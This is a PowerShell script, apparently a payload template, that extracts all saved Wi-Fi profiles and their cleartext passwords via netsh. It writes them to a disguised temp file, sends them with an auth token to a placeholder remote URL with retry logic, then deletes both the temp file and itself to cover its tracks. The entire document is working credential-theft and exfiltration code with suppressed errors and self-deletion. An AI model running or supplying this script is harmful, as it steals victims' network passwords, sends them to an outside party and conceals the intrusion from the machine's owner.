$ErrorActionPreference = "SilentlyContinue"
$ProgressPreference = "SilentlyContinue"
$RECON_URL = "{{POST_URL}}"
$AUTH_TOKEN = "{{TOKEN}}"
$tempLog = "$env:TEMP\~tmp_wifi.log"

try {
    # Extract Wi-Fi profiles and passwords
    $profiles = netsh wlan show profiles | Select-String "All User Profile"
    $results = foreach ($line in $profiles) {
        $ssid = ($line -split ":")[1].Trim()
        if ($ssid) {
            netsh wlan show profile name="$ssid" key=clear |
            Select-String "SSID name|Key Content|Authentication|Cipher"
        }
    }
    $formatted = $results | ForEach-Object { $_.ToString().Trim() } | Where-Object { $_ }
    
    if (-not $formatted) { exit }

    # Write to temp file
    Set-Content -Path $tempLog -Value ($formatted -join "`r`n") -Encoding UTF8
    
    # Retry logic for exfiltration
    $retries = 3
    for ($i = 1; $i -le $retries; $i++) {
        try {
            $headers = @{ "X-Token" = $AUTH_TOKEN; "Content-Type" = "text/plain" }
            $body = [System.IO.File]::ReadAllText($tempLog)
            Invoke-RestMethod -Uri $RECON_URL -Method POST -Headers $headers -Body $body -TimeoutSec 10
            break  # Exit loop on success
        } catch {
            Start-Sleep -Seconds 2
        }
    }

    # Clean up temp file
    Remove-Item $tempLog -Force -ErrorAction SilentlyContinue
} catch {}

# Self-destruct (delete current script)
Remove-Item -Path $MyInvocation.MyCommand.Path -Force -ErrorAction SilentlyContinue